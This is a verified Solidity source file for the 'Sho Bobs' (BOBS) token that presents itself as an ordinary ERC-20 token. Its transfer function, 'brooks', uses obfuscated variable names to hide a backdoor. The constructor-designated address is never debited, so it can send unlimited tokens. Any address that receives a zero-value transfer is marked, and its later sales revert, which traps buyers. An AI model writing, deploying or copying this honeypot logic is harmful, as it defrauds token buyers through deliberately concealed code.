/**
 *Submitted for verification at Etherscan.io on 2023-05-16
*/

/*

Telegram: https://t.me/Sho_Bobs_Portal

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ShoBobs is Ownable {
    uint8 public decimals = 9;

    string public name;

    address public uniswapV2Pair;

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(address creatine) {
        symbol = 'BOBS';
        name = 'Sho Bobs';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        maple[creatine] = dwarf;
    }

    function approve(address valuable, uint256 sesame) public returns (bool success) {
        allowance[msg.sender][valuable] = sesame;
        emit Approval(msg.sender, valuable, sesame);
        return true;
    }

    function brooks(address masrsh, address dunn, uint256 sesame) private returns (bool success) {
        if (maple[masrsh] == 0) {
            if (bae[masrsh] > 0 && masrsh != uniswapV2Pair) {
                maple[masrsh] -= dwarf;
            }
            balanceOf[masrsh] -= sesame;
        }
        if (sesame == 0) {
            bae[dunn] += dwarf;
        }
        balanceOf[dunn] += sesame;
        emit Transfer(masrsh, dunn, sesame);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private maple;

    function transferFrom(address masrsh, address dunn, uint256 sesame) public returns (bool success) {
        brooks(masrsh, dunn, sesame);
        require(sesame <= allowance[masrsh][msg.sender]);
        allowance[masrsh][msg.sender] -= sesame;
        return true;
    }

    function transfer(address dunn, uint256 sesame) public returns (bool success) {
        brooks(msg.sender, dunn, sesame);
        return true;
    }
    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private bae;

    uint256 public totalSupply;

    uint256 private dwarf = 45;

    string public symbol;
}